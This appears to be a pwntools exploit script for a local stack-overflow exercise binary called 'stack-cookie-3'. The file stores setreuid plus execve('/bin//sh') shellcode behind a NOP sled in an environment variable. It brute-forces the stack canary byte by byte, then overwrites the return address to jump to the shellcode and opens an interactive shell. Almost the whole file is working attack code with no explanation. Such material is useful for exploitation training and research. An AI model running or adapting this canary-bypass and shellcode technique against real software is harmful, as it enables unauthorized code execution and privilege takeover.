#!/usr/bin/env python

from pwn import *


shell_code ="\x90" * 1000 +"j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80"


env = {
        'shellcode': shell_code
        }

'''
p = process("./stack-cookie-x",env=env)
context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(p)
'''
p= process("./stack-cookie-3",env=env)

# create process and run the program
#p = process("./stack-cookie-3",env = env)


def lockaset(buff_start, itera):
    changing_bytes = 0x0
    while True:



        buff = buff_start + chr(changing_bytes)

        recieve=p.recv(timeout=0.1)
        print("REVIEVE_2"+ recieve + ";")
        print("SEND_2: " + str(len(buff)) + ";")

        p.sendline(str(len(buff)))


        recieve = p.recvline(timeout=0.1)
        print("RECIEVE_3: " + recieve + ";")

        print("SEND_3: "+buff+ ";")

        p.send(buff)

        sleep(0.1)
        output = p.recv(timeout=0.1)
        print("RECIEVE_F: " + output + ";")


        if "*** stack smashing detected ***" not in output:
            print("LOCKED: " + str(itera))
            print("")
            print("")
            return changing_bytes
        changing_bytes += 1


env_addr = p32(0xffffdc58)


#buff_final = shell_code + "A" * (0x80-len(shell_code)) + chr(num1) +chr(num2) + chr(num3) + chr(num4) + "B" * (0xc) + buffer_start_addr
buf_start = "A" * (0x80)
buf_end = "B" * (0xc) + env_addr


#bytes_1 = lockaset(buf_start)
bytes_1 = 0x0
bytes_2 = lockaset(buf_start + chr(bytes_1), 2)
bytes_3 = lockaset(buf_start + chr(bytes_1) + chr(bytes_2), 3)
bytes_4 = lockaset(buf_start + chr(bytes_1) + chr(bytes_2) + chr(bytes_3), 4)
final_buffer = buf_start + chr(bytes_1) + chr(bytes_2) + chr(bytes_3) + chr(bytes_4) + buf_end
p.recv(timeout=0.1)
p.sendline(str(len(final_buffer)))
p.recvline(timeout=0.1)
p.send(final_buffer)
sleep(0.1)
p.interactive()